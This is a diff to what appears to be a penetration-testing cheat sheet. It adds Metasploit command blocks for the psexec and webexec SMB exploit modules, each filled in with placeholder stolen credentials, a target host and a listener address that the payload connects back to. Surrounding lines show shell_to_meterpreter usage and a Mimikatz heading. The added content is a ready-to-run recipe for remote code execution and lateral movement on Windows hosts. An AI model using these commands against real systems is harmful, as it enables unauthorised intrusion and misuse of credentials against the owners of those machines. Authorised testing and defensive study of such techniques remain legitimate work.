@@ -228,6 +228,45 @@ use post/multi/manage/shell_to_meterpreter
 run -o LHOST=<tun0>,LPORT=<10003>,SESSION=<1>
 ```
 
+# Execute applications over SMB
+## psexec
+### Options
+```ruby
+use exploit/windows/smb/psexec
+set RHOSTS <ip>
+set SMBPass <password>
+set SMBUser <user>
+set SMBDomain <domain>
+set SRVHOST <handler_listen_ip>
+set SRVPORT <handler_listen_port>
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
+```
+### Run
+```ruby
+use exploit/windows/smb/psexec
+run -o SMBPass=<password>,SMBUser=<user>,SMBDomain=<domain>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
+```
+
+## webexec
+### Options
+```ruby
+use exploit/windows/smb/webexec
+set RHOSTS <ip>
+set SMBPass <password>
+set SMBUser <user>
+set SMBDomain <domain>
+set SRVHOST <handler_listen_ip>
+set SRVPORT <handler_listen_port>
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
+```
+
+### Run
+```ruby
+use exploit/windows/smb/webexec
+run -o SMBPass=<password>,SMBUser=<user>,SMBDomain=<domain>,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port> <ip>
+```
 
 # Mimikatz
 ## Meterpreter
